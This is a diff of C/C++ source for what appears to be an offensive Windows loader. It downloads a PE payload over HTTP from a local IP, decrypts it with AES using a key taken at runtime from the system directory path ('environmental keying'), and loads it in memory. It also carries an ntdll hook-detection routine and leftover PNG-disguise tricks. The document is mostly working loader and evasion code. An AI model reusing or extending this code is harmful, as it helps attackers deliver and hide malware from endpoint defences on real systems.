@@ -3,11 +3,15 @@
 #include <winternl.h>		// For Ntdll parsing
 #include <winhttp.h>		// For http Operation
 #include <vector>
+#include <wincrypt.h>
 
+#pragma comment (lib, "crypt32.lib")    //  For AES Encryption
 #pragma comment(lib, "winhttp")
 #pragma comment (lib, "user32")			// For EnumThreadWindows()
+#pragma comment (lib, "advapi32")
 
-//#pragma warning (disable: 4996)
+#pragma warning (disable: 4996)
+#define _CRT_SECURE_NO_WARNINGS
 
 unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
 unsigned char sNt[] = { 'N', 't', 0x0 };
@@ -50,7 +54,7 @@ void Load_PE(char* pe, DWORD pe_size)
 
 /* 	====================================================================== For HTTP GET Request ============================================================================		*/
 
-#define PAYLOAD_URI "192.168.0.104"
+#define PAYLOAD_URI "192.168.0.101"
 //#define PAYLOAD_URI "https://github.com/reveng007/Executable_Files/raw/main/"
 
 //#define Target_File "win10-ntdll_22H2_19045-2486.dll"
@@ -62,8 +66,8 @@ void Load_PE(char* pe, DWORD pe_size)
 #define MAX 100
 
 // From link: https://stackoverflow.com/questions/38672719/post-request-in-winhttp-c
-int GET_PE()
-//int main()
+//int GET_PE()
+int main()
 {
 	//structure data;
     std::vector<unsigned char> buffer;
@@ -234,12 +238,36 @@ int GET_PE()
     //printf("Size of PE data => %d\n", data.len);
     printf("Size of PE data => %d\n", size);
 
+    // Method1: ============================================= Replacing PNG bytes with PE bytes ====================================================
 
-    // Updating 1st 2bytes: M and Z
+    /*
+    for (int i = 0; i < buffer.size(); i++)
+    {
+        if(i == 0)
+        {
+            printf("1st byte of PE: %c\n", buffer[i]);
 
-    //unsigned char update1 = 'M';
-    //unsigned char update2 = 'Z';
+            printf("Updating it to: %c\n", update1);
+            bufdata[i] = update1;
+        }
 
+        if(i == 1)
+        {
+            printf("2nd byte of PE: %c\n", buffer[i]);
+
+            printf("Updating it to: %c\n", update2);
+            bufdata[i] = update2;
+        }
+    }
+    */
+
+    // ============================================= Replacing PNG bytes with PE bytes ====================================================
+
+
+
+    // Method2: ============================================= Removing Appended PNG bytes ====================================================
+
+    /*
     bufdata = (char*)malloc(size-4);
     int j = 0;
     for (int i = 4; i < (buffer.size()-4); i++)
@@ -270,37 +298,100 @@ int GET_PE()
 
         j++;
     }
+    */
 
 
-    /*
-    for (int i = 0; i < buffer.size(); i++)
+    // ============================================== Removing Appended PNG bytes ====================================================
+
+
+    // Method3: ============================================= AES decryption and KEY(Env. Keying Factor with No Initial Recon needed!) ==================================
+
+    // 1. Retrieving key: No hardcoded password as well as No Intial Recon needed
+
+    char KEY[MAX];
+    UINT KEYlen = sizeof(KEY);
+    
+    UINT size_key = GetSystemDirectoryA(KEY, KEYlen);
+
+    printf("\n[+] Retrieved Key at RunTime (using Environmental Keying with No initial Recon necessary): %s\n", KEY); //getchar();
+
+    printf("[+] Retrieved Key length: %d\n", (int)size_key); //getchar();
+
+    char KEY_16[16];
+
+    int i = 0, count = 1;
+    while (KEY[i] != '\0')
     {
-    	if(i == 0)
-    	{
-    		printf("1st byte of PE: %c\n", buffer[i]);
-
-    		printf("Updating it to: %c\n", update1);
-    		bufdata[i] = update1;
-    	}
-
-        if(i == 1)
-        {
-            printf("2nd byte of PE: %c\n", buffer[i]);
-
-            printf("Updating it to: %c\n", update2);
-            bufdata[i] = update2;
+        if(count <= 16)
+        {    
+            //printf("The Character at %d Index Position = %c \n", i, KEY[i]); getchar();
+            KEY_16[i] = KEY[i];
+            //printf("The Character at %d Index Position = %c \n", i, KEY_16[i]);
+            i++;
+            count++;
+        }
+        else
+        {   // null terminator
+            KEY_16[i] = '\0';
+            break;
         }
     }
-    */
+
+    size_t KEY_16len = sizeof(KEY_16);
+
+    printf("[+] Stripped Key: %s\n", KEY_16); //getchar();
+
+    printf("[+] Stripped Key length: %d\n", KEY_16len); //getchar();
+
+    // 2. AES Decryption:
+
+    DWORD uint_size = (UINT)size;
+
+    //printf("[+] PE length before encryption: %d\n", uint_size);
+
+    HCRYPTPROV hProv;
+    HCRYPTHASH hHash;
+    HCRYPTKEY hKey;
+
+    printf("[*] PE Decryption Started...\n");
+
+    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+            printf("[-] CryptAcquireContextW ERROR! \n");
+            return -1;
+    }
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
+            printf("[-] CryptCreateHash ERROR! \n");
+            return -1;
+    }
+    if (!CryptHashData(hHash, (BYTE*)KEY_16, (DWORD)KEY_16len, 0)){
+            printf("[-] CryptHashData ERROR! \n");
+            return -1;
+    }
+    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
+            printf("[-] CryptDeriveKey ERROR! \n");
+            return -1;
+    }
+    
+    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE *)bufdata, &uint_size)){
+            printf("[-] CryptDecrypt ERROR! %u\n", GetLastError());
+            return -1;
+    }
+    
+    CryptReleaseContext(hProv, 0);
+    CryptDestroyHash(hHash);
+    CryptDestroyKey(hKey);
+
+
+    printf("\n[+] PE Decryption Ended!\n");
+
+    // ============================================= AES decryption and KEY(Env. Keying Factor with No Initial Recon needed!) =============================
+
 
     // ==========================================
     // Call Load_PE and then send the pointer to the address and the size of the pe payload
 
     //Load_PE((char *)data.data, data.len);
 	// ==========================================
-
-
-
 
     /*  ****************************************************************** Loading PE in-memory ***************************************************************************	*/
 
@@ -525,8 +616,8 @@ int GET_PE()
 }
 
 
-int main()
-//int DetectHooks()
+//int main()
+int DetectHooks()
 {
 	HMODULE BaseAddr = GetModuleHandle((LPCSTR) sNtdll);
 	//HMODULE BaseAddr = LoadLibrary((LPCSTR) sNtdll);
@@ -601,7 +692,7 @@ int main()
 
 	printf("Press Enter to Exit Prompt... "); getchar();
 
-	int e = GET_PE();
+	//int e = GET_PE();
 
 	return 0;
 }
